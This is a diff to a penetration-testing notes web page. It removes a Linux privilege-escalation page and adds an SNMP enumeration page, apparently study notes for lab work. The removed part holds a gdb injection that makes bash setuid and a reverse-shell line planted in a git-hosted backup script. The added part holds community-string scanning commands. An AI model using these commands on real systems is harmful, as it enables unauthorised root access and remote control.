@@ -64,36 +64,28 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="e09afef9-e3c5-4561-8c53-accaf51bc1b0" class="page sans"><header><h1 class="page-title">General</h1></header><div class="page-body"><p id="a6a65d10-460f-441a-a572-d3b132cf578d" class=""><strong>Linux Guides:</strong></p><ul id="43b89f22-f7c2-4210-901f-feef06a209dd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sirensecurity.io/blog/linux-privilege-escalation-resources/"><strong>https://sirensecurity.io/blog/linux-privilege-escalation-resources/</strong></a></li></ul><ul id="74652950-b282-4e7d-a3ba-22174a7b1770" class="bulleted-list"><li style="list-style-type:disc"><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li></ul><ul id="4349e6cd-0663-4932-90f1-5b9b2b3ef7f8" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md</a></li></ul><ul id="27e2dc03-2eb7-4e58-a555-072eb39829e0" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist">https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist</a></li></ul><ul id="466c7e7b-4e6c-4e01-913c-8616af9519fb" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html</a></li></ul><p id="bc9e8a75-004f-4ba3-9a1f-0f4ad9460fc6" class="">
-</p><ol type="1" id="e6a80d93-57f0-4ea2-84ce-88c746883269" class="numbered-list" start="1"><li>See what tools are installed that I usually use (which python3, which wget, which curl, which nc, etc. Also uname -a to see kernel version.</li></ol><ol type="1" id="9d12ce07-e776-49a7-9d29-576b6919d836" class="numbered-list" start="2"><li>list out all files in directories such as /tmp, /opt, /mnt, /media, /home,
-/etc/passwd (write perms?), /var/www/ (config files?), numerous times
-just doing this has shown me the path to root that other scripts
-wouldn&#x27;t really find.</li></ol><ol type="1" id="1be35e96-ef94-4198-9e4d-56df1c6b6b84" class="numbered-list" start="3"><li>echo $PATH (anything weird?), cat /etc/crontab (any weird jobs?), sudo -l (any sudo perms?)</li></ol><ol type="1" id="54b49e53-6fec-4845-a891-6dc048f3bfd9" class="numbered-list" start="4"><li>finally, look for SUID perms on files and compare output against <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>find <strong>/</strong> -perm <strong>u=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></li></ol><p id="d72eefda-40aa-4556-8dfc-0cfb5a51e543" class=""><strong>Restricted Bash:</strong></p><ul id="16307862-06bd-4a96-afc4-3a03c25ff591" class="bulleted-list"><li style="list-style-type:disc"><a href="https://0xffsec.com/handbook/shells/restricted-shells/">https://0xffsec.com/handbook/shells/restricted-shells/</a></li></ul><pre id="59903c35-6883-4a0c-b822-1c78491080e2" class="code"><code>#Creating a space in bash terminal
-${IFS}</code></pre><p id="815f4a5f-a701-4169-8262-045c1bbeaf74" class=""><strong>Bash root process escalation:</strong></p><pre id="3778509e-6e43-4a28-9201-9e36bf44ee3c" class="code"><code>developer@faculty:~$ ps faux | grep ^root | grep python3
-root   731   0.0  0.9  26896 18200   Ss   Jul02   0:00 /usr/bin/python3 .....
-developer@faculty:~$ gdb -p 731
-Attaching to process 731
-(gdb) call (void)system(&quot;chmod u+s /bin/bash&quot;)
-quit
-bash -p</code></pre><p id="e4fe4480-b36f-42da-99df-faf8cf0d1026" class=""><strong>Git:</strong></p><pre id="dd784bca-a8cc-408e-87f7-34bfb57f0def" class="code"><code>GIT_SSH_COMMAND=&#x27;ssh -i id_rsa -p 43022&#x27; git clone gituser@0.0.0.0:/git-server
-cd git-server
-kali@kali:~/git-server$ git config --global user.name &quot;kali&quot;
-kali@kali:~/git-server$ git config --global user.email &quot;kali@kali.(none)&quot;
-#
-kali@kali:~/git-server$ echo &quot;sh -i &gt;&amp; /dev/tcp/0.0.0.0/8080 0&gt;&amp;1&quot; &gt;&gt; backups.sh 
-kali@kali:~/git-server$ chmod +x backups.sh
-#
-kali@kali:~/git-server$ GIT_SSH_COMMAND=&#x27;ssh -i ~/id_rsa -p 43022&#x27; git push origin master
-Enumerating objects: 5, done.
-Counting objects: 100% (5/5), done.
-Delta compression using up to 4 threads
-Compressing objects: 100% (3/3), done.
-Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
-Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
-To 192.168.120.204:/git-server
-   b50f4e5..0212790  master -&gt; master
-kali@kali:~/git-server$</code></pre><p id="608c6d98-c498-49ab-9615-873e4fe68470" class="">
-</p></div></article></main></main>
+    <main class="main"><article id="4a87cde5-f814-4303-bb64-d545d5d86571" class="page sans"><header><h1 class="page-title">SNMP (161/162)</h1></header><div class="page-body"><p id="0ac6d7ae-6f1f-41c2-a033-e1ca5e32cc96" class="">MIB tree:</p><table id="117add73-c096-4c3c-8197-aa6844f8b7e7" class="simple-table"><tbody><tr id="44daf540-87e2-4f0d-9e8c-d6b291837e6a"><td id="Saw?" class="">1.3.6.1.2.1.25.1.6.0</td><td id="ksWT" class="">System Processes</td></tr><tr id="d4c8ab78-fe9b-44c2-b659-34e07d906b6e"><td id="Saw?" class="">1.3.6.1.2.1.25.4.2.1.2</td><td id="ksWT" class="">Running Programs</td></tr><tr id="8894cffa-d5b2-42b5-a08f-6a4eaef6a7d8"><td id="Saw?" class="">1.3.6.1.2.1.25.4.2.1.4</td><td id="ksWT" class="">Processes Path</td></tr><tr id="b0062578-46e6-408f-88de-cd27fba689b1"><td id="Saw?" class="">1.3.6.1.2.1.25.2.3.1.4</td><td id="ksWT" class="">Storage Units</td></tr><tr id="22af77bb-5dc7-4683-9622-03403abbdf67"><td id="Saw?" class="">1.3.6.1.2.1.25.6.3.1.2</td><td id="ksWT" class="">Software Name</td></tr><tr id="9613bfab-1a6c-493f-a5fb-1eeb95f9e8f6"><td id="Saw?" class="">1.3.6.1.4.1.77.1.2.25</td><td id="ksWT" class="">User Accounts</td></tr><tr id="64ae7ccb-4fd4-43bd-98c0-55f7eba8992b"><td id="Saw?" class="">1.3.6.1.2.1.6.13.1.3</td><td id="ksWT" class="">TCP Local Ports</td></tr></tbody></table><p id="71bed8e8-61b9-40cb-b417-ff0bb2b4f0cb" class="">snmpwalk and snmpenum</p><p id="6400c4c0-fe75-48a8-b83e-a74123f2c617" class="">
+</p><pre id="a074513f-860a-4697-a1da-cb0b590023c4" class="code"><code>snmpwalk -c public -v1 -t 10 0.0.0.0
+#enumerates windows users
+snmpwalk -c public -v1 0.0.0.0 1.3.6.1.4.1.77.1.2.25
+#enumerate running processes
+snmpwalk -c public -v1 0.0.0.0 1.3.6.1.2.1.25.4.2.1.2
+#enumerate open TCP ports
+snmpwalk -c public -v1 0.0.0.0 1.3.6.1.2.1.6.13.1.3</code></pre><p id="a94b8107-7f07-44bb-afa1-ddabc9183bd0" class="">
+</p><pre id="78bb2271-112e-4f05-83ca-ec1a3ea92404" class="code"><code>sudo nmap -sU --open -p 161 0.0.0.0-254 -oG open-snmp.txt
+sudo nmap -sU -p161 --script *snmp* $target</code></pre><p id="00912e80-a5cc-41d1-9636-975ecb870ec7" class="">
+</p><pre id="44259093-e6df-44ca-beb5-b64a70029cce" class="code"><code>kali@kali:~$ echo public &gt; community
+kali@kali:~$ echo private &gt;&gt; community
+kali@kali:~$ echo manager &gt;&gt; community
+
+kali@kali:~$ for ip in $(seq 1 254); do echo 10.11.1.$ip; done &gt; ips
+
+kali@kali:~$ onesixtyone -c community -i ips
+Scanning 254 hosts, 3 communities
+10.11.1.14 [public] Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)
+10.11.1.13 [public] Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)
+10.11.1.22 [public] Linux barry 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686
+...</code></pre><ul id="0027586a-b42f-4f7d-b12a-67190afd1bed" class="bulleted-list"><li style="list-style-type:disc">Once we find SNMP services, we can start querying them for specific MIB data that might be interesting.</li></ul></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
